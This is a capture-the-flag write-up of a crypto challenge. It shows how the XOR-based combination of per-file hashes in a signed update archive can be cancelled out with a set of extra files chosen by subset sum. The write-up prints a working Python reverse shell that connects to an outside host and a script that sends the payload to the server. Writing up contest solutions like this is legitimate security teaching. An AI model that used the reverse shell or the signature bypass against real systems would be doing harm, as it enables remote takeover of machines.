# Software update (Crypto, 182p, 23 solved)

In the task we get a package with the server script and example archive with "software update".
The server script simply reads a base64 encoded zip file from the socket, unpacks it, calculates expected signature of the archive contents and compares it with the attached signature.

If the signature matches the archive contents the server runs two python scripts inside the archive.
If we could add our own code in one of those scripts, we would gain RCE on the server.

Signature verification is:

```python
def check_signature(path, public_key):
    
    hash_value = compute_hash(path + "/signed_data")
    with open(path + "/" + signature_filename, "rb") as f:
        signature = f.read()
    verifier = PKCS1_PSS.new(public_key)
    return verifier.verify(Crypto.Hash.SHA256.new(hash_value), signature)
```

and it's rather solid. 
The RSA public key is strong and there is no way of forging the signature.

We have the example [update archive](sw_update.zip) with it's initial, correct signature.
It's the only signature we can really use, so the only way to smuggle some of our own code is if the archive contents hash does not change.

The hash is calculated as:

```python
def compute_hash(directory):
    """compute a hash of all files contained in <directory>."""
    
    files = glob.glob(directory + "/**", recursive=True)
    files.sort()
    files.remove(directory + "/")
    result = bytearray(hashlib.sha256().digest_size)
    
    for filename in files:
        complete_path = filename
        relative_path = os.path.relpath(filename, directory)
        if os.path.isfile(complete_path):
            with open(complete_path, "rb") as f:
                h = hashlib.sha256(relative_path.encode('ASCII'))
                h.update(b"\0")
                h.update(f.read())
        elif os.path.isdir(complete_path):
            relative_path += "/"
            h = hashlib.sha256(relative_path.encode('ASCII') + b"\0")
        else:
            pass
        
        result = xor(result, h.digest())
    
    return result
```

Initially we tried to use the fact that this function does not take into consideration all files, and does not count symlinks.
For example if this code: `relative_path += "/"` was not there, we could put a directory intead of one of the python files, without changing the archive hash.
Finally we came into conclusion that this can't be done.

The interesting thing to notice about this function is `result = xor(result, h.digest())`.

It contains a bug, most likely unintended - if we include a symlink in the archive, then new value of `h` will not be computed, and thus the xor will be performed again with the previous file hash, nullifying it.
Sadly this was not really exploitable.

This `xor` here is unusual, and we figured that we need to use it.
We can change one of the python scripts, and calculate the new hash.
Then we can xor this new hash with the old hash, and we will get the `difference hash`.
If we could now generate a file which would be hashed to this exact value, we could use it to nullify the changes we made to the script.
But this would mean basically breaking sha256, because we would like to get a plaintext for a given hash value...

However, we don't need to do this with a single file!
We can use as many files as we need.
This becomes a problem similar to `Subset Sum` - given a list of random files for which we know sha256 hashes, we would like to know if `xor` of a subset of those hashes gives the `difference hash` we have.
We generated a bunch of empty randomly-named files, hashed them the same way as in the server (so with trialing nullbyte), and the run a modified `subset sum` solver on them, with the target value set to the `difference hash`.

This way we got a list of files, which included in the archive would cause the archive hash to be identical to the initial one.
Once we knew the method works we created a reverse shell in on the installer python scripts:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("tailcall.net",12345))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

we generated a new set of files to include in the archive, zipped it and sent to the server via:

```python
def send_payload():
    with codecs.open("new_update/sw_update.zip", "rb") as input_file:
        payload = base64.b64encode(input_file.read())
        s = nc("35.198.64.68", 2023)
        msg = s.recv(9999)
        challenge = re.findall(b"Proof of work challenge: (.*)\s+", msg)[0]
        send(s, str(solve_proof_of_work(challenge)))
        print(s.recv(9999))
        send(s, payload)
        print(s.recv(9999))
send_payload()
```

And after a moment we got a connection to our reverse shell.
